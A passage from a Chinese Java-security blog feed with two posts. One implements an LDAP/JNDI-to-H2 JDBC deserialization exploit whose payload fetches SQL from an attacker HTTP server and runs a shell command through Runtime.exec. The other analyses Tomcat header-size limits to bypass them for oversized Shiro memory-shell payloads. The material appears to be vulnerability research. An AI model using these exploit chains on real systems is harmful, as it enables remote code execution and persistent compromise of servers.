class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit.controllers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> artsploit.Config;</span><br><span class="line"><span class="keyword">import</span> artsploit.Utilities;</span><br><span class="line"><span class="keyword">import</span> artsploit.annotations.LdapMapping;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"></span><br><span class="line"><span class="meta">@LdapMapping(uri = &#123; &quot;/o=h2&quot; &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCLDAP</span> <span class="keyword">implements</span> <span class="title class_">LdapController</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Sending LDAP ResourceRef result for &quot;</span> + base + <span class="string">&quot; with H2 payload&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadURL</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + Config.hostname + <span class="string">&quot;:&quot;</span> + Config.httpPort + Config.h2; <span class="comment">//get from config if not specified</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;&quot;</span> + payloadURL + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">h2Reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;org.h2.jdbcx.JdbcDataSource&quot;</span>, <span class="string">&quot;org.h2.jdbcx.JdbcDataSourceFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>, <span class="string">&quot;org.h2.Driver&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>, jdbcUrl));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;sa&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;sa&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;H2 connection&quot;</span>));</span><br><span class="line">        h2Reference.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;loginTimeout&quot;</span>, <span class="string">&quot;3&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">        e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">//could be any</span></span><br><span class="line">        e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Utilities.serialize(h2Reference));</span><br><span class="line"></span><br><span class="line">        result.sendSearchEntry(e);</span><br><span class="line">        result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>注意：</p><p>在Config.java中添加</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Parameter(names = &#123;&quot;--h2&quot;&#125;, description = &quot;[H2JDBCLDAP payload option] SQL file with command payload&quot;, order = 4)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="string">&quot;/poc.sql&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>在HttpServer.java添加</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&quot;/poc.sql&quot;</span>:</span><br><span class="line">    <span class="type">String</span> <span class="variable">pocSql</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\tjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;);\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;return s.hasNext() ? s.next() : \&quot;\&quot;;  &#125;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;$$;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;CALL SHELLEXEC(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    httpExchange.sendResponseHeaders(<span class="number">200</span>, pocSql.getBytes().length);</span><br><span class="line">    httpExchange.getResponseBody().write(pocSql.getBytes());</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div></blockquote><p>运行LDAP 服务：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419200812208.png" alt="image-20230419200812208"></p><p>2.将上面H2JDBCCB1的代码中的JDBC连接部分进行更改：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2JDBCCB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">SharedPoolDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SharedPoolDataSource</span>();</span><br><span class="line">        dataSource.setDataSourceName(<span class="string">&quot;ldap://192.168.28.1:1389/o=h2&quot;</span>);</span><br><span class="line">        <span class="comment">//省略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>3.运行H2JDBCCB1，可见反序列化执行成功：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230419195331533-16819052140851.png" alt="image-20230419195331533"></p><p>DBCP2在序列化对象中存储已用连接池的引用。反序列化对象时，它会尝试通过调用<code>InstanceKeyDataSourceFactory.getObjectIntance()</code>来重用该池。</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230420112901109.png" alt="image-20230420112901109"></p><p>可以通过提供一个空引用来进行“绕过”它：</p><p>（1）提供前</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230420115747030.png" alt="image-20230420115747030"></p><p>（2）提供后</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_image-20230420144525984.png" alt="image-20230420144525984"></p><blockquote><p>连接池引用是一个简单的数字，存储为字符串（“1”、“2”）。假设至少有一个连接池（这就是为什么首先要有连接池），攻击者可以简单地“使用”该引用，因为连接池是否指向不同的数据库并不重要。</p></blockquote><h1 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h1><p>文章中提到的拓展思路：</p><p>类似于H2 JDBC连接字符串中的“INIT”功能，一些 JDBC 池库允许为以下用例配置 SQL 查询：</p><ul><li>新连接的初始化</li><li>验证现有连接</li></ul><p>根据提供的数据库，这可能会在开发过程中被滥用。</p><p>如：</p><p>在 HSQLDB 2.7.1 之前，可以通过 SQL 执行任意静态 Java 方法 (CVE-2022-41853)。</p><p>参考：<a href="https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf">BCS2022-探索JNDI攻击.pdf</a>，调用System.setProperty并使用它来将<code>com.sun.jndi.rmi.object.trustURLCodebase</code>设置为true，从而重新启用JNDI 中的远程类加载，可以像之前一样远程执行代码：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL <span class="string">&quot;java.lang.System.setProperty&quot;</span>(<span class="string">&#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27;</span>, <span class="string">&#x27;true&#x27;</span>)</span><br></pre></td></tr></table></figure></div><blockquote><p>当应用程序尝试将攻击者提供的Gadget chain转换为预期对象时，会触发异常。在执行验证查询之前，数据库连接可能已经终止。初始化查询应该有效。</p></blockquote><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>本篇主要对参考文章中提到的思路进行了分析和实现。</p><p>参考：</p><p><a href="https://mogwailabs.de/en/blog/2023/04/look-mama-no-templatesimpl/">Look Mama, no TemplatesImpl</a></p><p><a href="https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">Make JDBC Attacks Brilliant Again I</a></p><p><a href="https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/">Make JDBC Attacks Brilliant Again II</a></p><p><a href="https://www.itguest.com/post/dbgce2b4.html">JDK17遇到报错 module java.base does not “opens java.util“ to unnamed module 问题解决</a></p><p><a href="https://www.cnblogs.com/flydean/p/12680291.html">在Spring Boot使用H2内存数据库</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDBC </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Shiro反序列化Payload长度绕过</title>
      <link href="/2023/02/21/%E6%B5%85%E6%9E%90Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/"/>
      <url>/2023/02/21/%E6%B5%85%E6%9E%90Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>之前在研究学习Shiro反序列化漏洞的利用时，发现当注入内存马&#x2F;回显执行命令时，生成的部分Payload会因为超过Tomcat Header长度限制，而无法成功利用。同时对网上常用的长度绕过方法进行尝试，可能由于一些未知原因，没有绕过成功。于是本文打算通过对网上已有方法进行分析和利用尝试，从而达到成功绕过的目的。</p><h2 id="1-Tomcat-Header长度限制"><a href="#1-Tomcat-Header长度限制" class="headerlink" title="1. Tomcat Header长度限制"></a>1. Tomcat Header长度限制</h2><p><strong>在Tomcat中怎样实现对Header长度的限制？</strong></p><p>在Tomcat中对Header长度的限制，是通过配置maxHttpHeaderSize来实现的，默认配置是8192字节，即8KB。下面是不同Tomcat版本的maxHttpHeaderSize：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tomcat 8.0.47等</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">maxHttpHeaderSize</span> <span class="operator">=</span> <span class="number">8192</span>;</span><br><span class="line"><span class="comment">//Tomcat 8.5.78、Tomcat 9.0.68等</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> maxHttpHeaderSize;</span><br><span class="line"><span class="built_in">this</span>.maxHttpHeaderSize = <span class="number">8192</span>;</span><br></pre></td></tr></table></figure></div><p><strong>maxHttpHeaderSize分析</strong></p><p><code>org.apache.coyote.http11.AbstractHttp11Protocol</code>类的maxHttpHeaderSize属性，可以对Tomcat中的Header长度进行限制。</p><p>在这个类中有该属性的get和set方法：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671520110286-0e52abff-6205-498a-b7f5-aa65b19708dd.png" alt="image.png"></p><p>接下来寻找哪个地方调用了其get方法，发现在<code>org.apache.coyote.http11.Http11Processor</code>类的构造方法中进行了调用：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671519444088-c56bb48c-34cf-4246-a0b5-17a669a2abd2.png" alt="image.png"></p><p>在上图看到，maxHeaderSize属性的值会影响inputBuffer和outputBuffer两个属性的值，而inputBuffer和outputBuffer两个属性分别是Http11InputBuffer和Http11OutputBuffer的类对象。</p><p>于是接下来看Http11InputBuffer类和Http11OutputBuffer类，发现在Http11OutputBuffer类中maxHeaderSize属性的值在构造方法中会作为headerBufferSize被传入到<code>ByteBuffer.allocate</code>方法，并将方法返回结果赋值到headerBuffer属性(ByteBuffer的类对象)：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671520864078-c30c9d21-6776-4205-a4d0-aa5fc12471a7.png" alt="image.png"></p><p>跟进<code>ByteBuffer.allocate</code>方法，会<code>return new HeapByteBuffer(capacity, capacity);</code>，即创建一个新的Header Buffer：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671521223215-d902335d-9770-4edc-9da1-3c42bf72ea73.png" alt="image.png"></p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671522044427-22d7d8fd-d465-4438-bf6c-22beecc42ab4.png" alt="image.png"></p><p>所以，在进行HTTP请求时，将会根据maxHttpHeaderSize属性的值，创建一个新的Header Buffer空间，大小为maxHttpHeaderSize属性的值，即8KB。Header的输出和输入都不可以超出这个大小限制，如果超出这个限制，就会抛出异常。</p><p><strong>绕过Header长度限制的思路</strong></p><p>根据Header长度限制的原理，很容易想到绕过Header长度限制的根本思路：</p><ol><li><p>增加Tomcat允许HTTP Header最大值</p><blockquote><p>配置参数maxHttpHeaderSize可以设置Tomcat允许的HTTP Header最大值。</p></blockquote></li><li><p>减少HTTP Header的Size</p><blockquote><p>如：在HTTP请求包中减少无关的Header、压缩编码等。</p></blockquote></li></ol><h2 id="2-方法浅析及利用"><a href="#2-方法浅析及利用" class="headerlink" title="2. 方法浅析及利用"></a>2. 方法浅析及利用</h2><h3 id="2-1-增加Tomcat允许HTTP-Header最大值"><a href="#2-1-增加Tomcat允许HTTP-Header最大值" class="headerlink" title="2.1. 增加Tomcat允许HTTP Header最大值"></a>2.1. 增加Tomcat允许HTTP Header最大值</h3><h4 id="2-1-1-修改maxHttpHeaderSize"><a href="#2-1-1-修改maxHttpHeaderSize" class="headerlink" title="2.1.1. 修改maxHttpHeaderSize"></a>2.1.1. 修改maxHttpHeaderSize</h4><p>在Tomcat的server.xml里面可以设置maxHttpHeaderSize。</p><p>但我们的目的是实现动态修改maxHttpHeaderSize属性的值。</p><p>在实现动态修改前，我们先了解一下有关知识：</p><p>在上面对maxHttpHeaderSize分析中，我们了解到：</p><blockquote><p>在进行HTTP请求时，将会根据maxHttpHeaderSize属性的值，创建一个新的Header Buffer空间，大小为maxHttpHeaderSize属性的值，即8KB</p></blockquote><p>同时我们也知道：</p><blockquote><p>每一次HTTP请求到达Web服务，Tomcat都会创建一个线程来处理该请求。</p></blockquote><p>从Litch1师傅的文章里了解到：</p><blockquote><p>request的inputbuffer会复用</p><p>在修改完maxHeaderSize之后，需要多个连接同时访问，让tomcat新建request的inputbuffer</p></blockquote><p><strong>inputBuffer是如何实现复用的？</strong></p><p>要找到这个问题的答案，当然需要翻源码了，想找到Request对象复用，首先需要知道创建Request对象的类，这里先编写两个RequestDemo输出在进行不同HTTP请求时，创建的线程名和Request对象实例：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/RequestDemo1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestDemo1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;:RequestDemo1 = &quot;</span> + req);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/RequestDemo2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestDemo2</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;:RequestDemo2 = &quot;</span> + req);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>运行，从Request对象实例中，可以看到Request对象的类全名为<code>org.apache.catalina.connector.RequestFacade</code>：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671589847025-50403a47-a9e8-4c28-bb80-bb3aa8b39e0e.png" alt="image.png"></p><p>于是接下来在RequestFacade类的构造方法中打上断点，进行调试分析：</p><p>1.首先跟进到RequestFacade对象创建的地方，即getRequest()方法</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671592534243-600709bc-9289-4769-955c-5d2e3ec704c1.png" alt="image.png"></p><p>该方法有两个 if 判断：</p><ul><li><p>第一个是判断facade是否为 null，不为null就new。</p></li><li><p>第二个是把facade赋值给applicationRequest对象，接着返回applicationRequest对象。</p></li></ul><p>产生一个思考：在第二个if中可以直接返回facade，为什么要赋值给applicationRequest？</p><p>这两个if是判断facade和applicationRequest是否为null：</p><ul><li><p>第一次访问时，必定为null。</p></li><li><p>那么之后什么时候又会变为null呢？</p><ul><li><p>发现在一次请求结束，执行recycle方法(<code>org.apache.catalina.connector.Request#recycle</code>)时：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">recycle</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    <span class="comment">//将applicationRequest直接设置为null</span></span><br><span class="line">    <span class="built_in">this</span>.applicationRequest = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//facade设置为null存在一个前提：getDiscardFacades方法返回为true(而这个参数默认是false)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.getDiscardFacades()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.facade != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.facade.clear();</span><br><span class="line">            <span class="built_in">this</span>.facade = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//省略部分代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>所以applicationRequest会在每次请求完成之后设置为null，而facade会保留下来。</p></li></ul><p>因此下一次请求过来的时候，facede并不为空，直接复用facade，把facade赋值给applicationRequest。</p><p>这也解释了：为什么上面两个RequestDemo输出的facade对象相同。</p><p>2.接着寻找创建facade对象的getRequest()方法在哪里会被调用</p><p>发现在StandardHostValve类的invoke方法中，有一个Request对象在调用getRequest方法：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    <span class="keyword">if</span> (!asyncAtStart &amp;&amp; !context.fireRequestInitEvent(request.getRequest())) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>3.接着顺着调用栈寻找Request对象最开始是从哪个方法开始作为入参传递的</p><p>找到<code>org.apache.coyote.http11.Http11Processor#service</code>是Request 对象最开始作为入参传递的地方。</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671598861063-0b029cfe-a6f5-4f64-8999-0ca69c698911.png" alt="image.png"></p><p>4.那么这个Request 对象又是如何产生的呢？</p><p>在Http11Processor的父类AbstractProcessor类中的request属性前打上断点，重新运行调试：</p><p>发现会停在AbstractProcessor 类的构造方法，这里就是request最开始产生的地方</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671604572720-547ab404-9648-4332-ae24-758a5a6aaa2f.png" alt="image.png"></p><p>5.那么这个coyoteRequest又是怎么来的呢？</p><p>顺着调用栈寻找，发现是new出来的</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671604741034-4707ea21-4ed6-4dbc-be91-eede82a1aae1.png" alt="image.png"></p><p>继续顺着调用栈，发现会createProcessor：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671605934423-40474551-b086-4a72-871f-1b35799e5013.png" alt="image.png"></p><p>在createProcessor前，会执行：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">processor = recycledProcessors.pop();</span><br></pre></td></tr></table></figure></div><p>所以，若从recycledProcessors里面pop出的processor对象不为null，则不会调用createProcessor方法，不调用createProcessor方法，也就不会创建RequestFacade对象。</p><p>6.接下来再来看看RecycledProcessors类</p><p>这个类有三个方法：push、pop、clear。</p><p>继承至 SynchronizedStack 对象，就是一个标准的栈结构，只不过是用Synchronized修改了对应的方法(push、pop、clear)。</p><p>上面已经有了调用pop方法的地方，那么在哪里会调用push方法呢？</p><p>于是在RecycledProcessors类的push方法中打上断点，进行调试，追踪调用栈发现，在请求处理完成，release当前processor时，会把这个processor放到recycledProcessors里面去，等下一次请求使用：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671607987378-cafc0014-4131-4646-b4af-d19fc0c03272.png" alt="image.png"></p><p>7.那么当进行HTTP请求时，会先看recycledProcessors这个栈结构里面有没有可用的processor：</p><p>若没有，则processor对象为null，调用createProcessor方法创建一个新的processor对象，在请求结束之后，将其放入到栈结构里面。</p><p>在调用createProcessor方法时，会new一个新的Request对象coyoteRequest，最终这个Request对象会封装为RequestFacade对象。</p><p>8.在org.apache.catalina.connector.Request的构造方法中打上断点，调试，顺着调用栈往前找，发现：</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671612586847-a2c9689c-4530-414f-8468-2c56a91f0590.png" alt="image.png"></p><p>在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中，有一行代码：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.setCoyoteRequest(req);</span><br><span class="line"><span class="comment">//request是org.apache.catalina.connector.Request对象</span></span><br><span class="line"><span class="comment">//req是org.apache.coyote.Request对象</span></span><br></pre></td></tr></table></figure></div><p>同时，根据**7.**中的分析，Processor和RequestFacade是一一对应的。</p><p>9.回到最开始的两个RequestDemo，为什么发起的两次请求，RequestFacade对象是同一个？</p><blockquote><p>上面分析过程中，说明是由于复用facade的缘故；</p><p>其实表面上看是同一个facade，实质上是同一个processor；</p><p>因为两次请求使用的是同一个processor。</p></blockquote><p>10.最终得到标题<code>inputBuffer是如何实现复用的？</code>的答案：</p><ul><li><p>processor是Http11Processor的类对象；</p></li><li><p>inputBuffer是Http11Processor的一个属性；</p></li><li><p>在进行HTTP请求时，会寻找recycledProcessors中是否有可用的processor，若没有，则processor为null；会调用createProcessor方法创建一个新的processor对象时，会new一个新的Request对象coyoteRequest，这个Request对象会封装为RequestFacade对象；</p></li><li><p>在进行HTTP请求时，Request对象的类全名为<code>org.apache.catalina.connector.RequestFacade</code>。</p></li></ul><p>所以，当有可用的processor时，进行HTTP请求，会导致inputBuffer的复用。</p><p><strong>绕过inputBuffer复用</strong></p><p>通过上面的分析，我们了解到：若两个请求使用的是不同的processor，也就不会存在复用，从而能绕过request的inputBuffer复用。</p><blockquote><p>Litch1师傅的方法：多个连接同时访问，让tomcat新建request的inputbuffer</p></blockquote><p>经过上面的分析，推测出其原理大概就是：</p><p>通过多个连接同时访问，实现在请求未完成时，对修改maxHttpHeaderSize的请求使用新的processor，从而创建新的Header Buffer，大小为maxHttpHeaderSize的值；接下来复用这个新的processor进行超过默认长度限制的<code>注入内存马/回显执行命令</code>等请求，最终实现绕过Tomcat Header长度限制的目的。</p><p><strong>测试</strong></p><p>这里不再编写测试环境和修改maxHttpHeaderSize的类。</p><p>1.测试环境</p><p>直接使用下面链接中的Shiro环境进行测试：</p><p>samples-web-1.2.4.war：<a href="https://github.com/backlion/demo/blob/master/samples-web-1.2.4.war">https://github.com/backlion/demo/blob/master/samples-web-1.2.4.war</a></p><p>修改maxHttpHeaderSize之前，将超过长度限制的<code>注入内存马/回显执行命令</code>等请求的Payload生成的rememberMe，在Cookie rememberMe中发送，响应400，说明超过了长度限制</p><p><img src="https://bl0g-1259018623.cos.ap-nanjing.myqcloud.com/blog_1671760248675-a34c99eb-6116-4493-9fcd-0d9682543b1c.png" alt="image.png"></p><p>2.修改maxHttpHeaderSize的类</p><p>直接参考网上常见的即可，如修改 max size 注入：<a 